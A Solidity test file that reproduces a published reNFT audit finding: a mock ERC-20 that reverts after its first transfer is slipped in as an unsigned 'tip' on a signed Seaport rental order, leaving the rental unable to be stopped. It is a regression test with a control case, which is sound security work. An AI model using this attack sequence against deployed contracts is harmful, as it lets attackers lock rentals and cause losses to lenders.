// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

import {
    Order,
    OrderParameters,
    OfferItem,
    ConsiderationItem,
    FulfillmentComponent,
    Fulfillment,
    ItemType as SeaportItemType
} from "@seaport-types/lib/ConsiderationStructs.sol";
import {OfferItemLib, ConsiderationItemLib} from "@seaport-sol/SeaportSol.sol";

import {BaseTest} from "@test/BaseTest.sol";
import {MockAlwaysRevertERC20} from "@test/vlun_poc/mocks__tokens__weird__MockAlwaysRevertERC20.sol";
import {MockERC20} from "@test/mocks/tokens/standard/MockERC20.sol";

import {OrderType, OrderMetadata} from "@src/libraries/RentalStructs.sol";

/// Succeeds on the first `transferFrom` and reverts on every later one.
contract MockRevertAfterTransferERC20 is MockAlwaysRevertERC20 {
    bool public shouldRevert;

    function transferFrom(address, address, uint256) public override returns (bool) {
        require(!shouldRevert, "transferFrom() revert");
        shouldRevert = true;
        return true;
    }
}

/// Reconstruction of finding 2024-01-renft/H-01 on the audited revision.
///
/// The published regression test (added by the mitigation commit) asserts a
/// specific revert selector, `Errors.CreatePolicy_PaymentNotWhitelisted`, which
/// only exists after the fix. Replaying that test verbatim on the audited
/// revision therefore cannot compile, which says nothing about the vulnerability.
///
/// This reconstruction keeps the reporter's attack sequence byte for byte and
/// replaces only the *conclusion*, asserting the security property itself:
///
///     SECURITY PROPERTY: a fulfilment whose ERC-20 consideration item cannot
///     complete its transfer must be rejected, because reNFT's stop-rent path
///     depends on that transfer succeeding. If the fulfilment is accepted, the
///     renter can never stop paying.
///
/// Polarity: `vm.expectRevert()` passes only when the protocol rejects the
/// malicious tip. On the audited revision the fulfilment succeeds, so this test
/// fails there and passes after the fix.
contract VlunMaliciousSeaportTipTest is BaseTest {
    using ConsiderationItemLib for ConsiderationItem;

    function test_VlunMaliciousSeaportTip_UnsettleableTipMustBeRejected() public {
        MockRevertAfterTransferERC20 testToken = new MockRevertAfterTransferERC20();

        // mint the token to bob
        testToken.mint(alice.addr, 100);

        // approve the conduit to pull the token
        vm.prank(bob.addr);
        testToken.approve(address(conduit), type(uint256).max);

        // create a BASE order
        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        // finalize the order creation
        (
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) = finalizeOrder();

        // create an order fulfillment
        createOrderFulfillment({
            _fulfiller: bob,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        // Add a consideration item tip to an order that has already been signed.
        // The order hash is already committed, so this tip is attacker-controlled
        // and was never part of what the lender signed.
        OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;
        params.consideration.push(
            ConsiderationItemLib
                .empty()
                .withItemType(SeaportItemType.ERC20)
                .withToken(address(testToken))
                .withIdentifierOrCriteria(0)
                .withStartAmount(100)
                .withEndAmount(100)
                .withRecipient(address(ESCRW))
        );

        // SECURITY PROPERTY: the fulfilment must revert because the payment token
        // cannot be settled.
        vm.expectRevert();
        finalizeBaseOrderFulfillment();
    }

    /// Control: with a well-behaved ERC-20 tip the same sequence is accepted, so
    /// the assertion above is discriminating rather than vacuously true.
    function test_VlunMaliciousSeaportTip_ControlWellBehavedTipIsAccepted() public {
        MockERC20 goodToken = new MockERC20();
        goodToken.mint(bob.addr, 100);
        vm.prank(bob.addr);
        goodToken.approve(address(conduit), type(uint256).max);

        createOrder({
            offerer: alice,
            orderType: OrderType.BASE,
            erc721Offers: 1,
            erc1155Offers: 0,
            erc20Offers: 0,
            erc721Considerations: 0,
            erc1155Considerations: 0,
            erc20Considerations: 1
        });

        (
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) = finalizeOrder();

        createOrderFulfillment({
            _fulfiller: bob,
            order: order,
            orderHash: orderHash,
            metadata: metadata
        });

        OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;
        params.consideration.push(
            ConsiderationItemLib
                .empty()
                .withItemType(SeaportItemType.ERC20)
                .withToken(address(goodToken))
                .withIdentifierOrCriteria(0)
                .withStartAmount(100)
                .withEndAmount(100)
                .withRecipient(address(ESCRW))
        );

        finalizeBaseOrderFulfillment();
    }
}
